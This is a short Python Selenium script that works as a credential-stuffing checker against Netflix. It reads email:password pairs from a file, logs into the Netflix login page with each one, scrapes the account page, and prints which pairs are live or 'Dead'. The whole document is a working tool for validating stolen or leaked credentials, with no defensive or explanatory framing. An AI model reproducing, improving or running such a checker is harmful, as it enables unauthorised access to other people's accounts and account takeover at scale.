from selenium import webdriver
import time
from bs4 import BeautifulSoup
driver = webdriver.Chrome()

def check(email, password):
    driver.get('https://www.netflix.com/br/login')
    email_elem = driver.find_element_by_xpath('//*[@id="id_userLoginId"]')
    password_elem = driver.find_element_by_xpath('//*[@id="id_password"]')
    button_elem = driver.find_elements_by_xpath('/html/body/div[1]/div/div[3]/div/div/div[1]/form/button')[0]

    email_elem.clear()
    password_elem.clear()

    email_elem.send_keys(email)
    password_elem.send_keys(password)
    button_elem.click()

    driver.get('https://www.netflix.com/YourAccount')
    parse = BeautifulSoup(driver.page_source, 'html5lib')

    try:
        print('{}:{} - {}'.format(email, password, parse.find_all('b')[0].get_text()))
    except:
        print('{}:{} - Dead'.format(email, password))

    driver.delete_all_cookies()

with open('input.txt') as s:
    for line in s:
        users, passwords = line.split(':')
        check(users.strip(), passwords.strip())